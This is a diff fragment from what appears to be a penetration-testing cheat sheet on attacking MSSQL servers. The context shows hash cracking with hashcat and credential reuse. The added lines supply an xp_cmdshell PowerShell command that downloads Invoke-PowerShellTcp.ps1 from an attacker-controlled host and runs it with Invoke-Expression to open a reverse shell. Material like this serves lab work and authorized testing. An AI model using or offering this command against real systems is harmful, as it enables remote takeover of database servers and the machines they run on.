@@ -380,6 +380,11 @@ hashcat -m 5600 mssql-svc.txt /usr/share/wordlists/rockyou.txt  --force
 ```
 4. We can use these creds to potentially re-authenticate on the MsSQL shell with higher permissions or maybe connect directly to the machine with smbexec etc.
 
+Once we have a xp_cmdshell we can try get a reverse shell with
+```
+xp_cmdshell powershell "Invoke-Expression (new-object Net.WebClient).DownloadString(''http://10.10.10.10:8000/Invoke-PowerShellTcp.ps1'')"
+```
+
 Alternative to impacket
 ```
 sqsh -S 192.168.1.101 -U sa
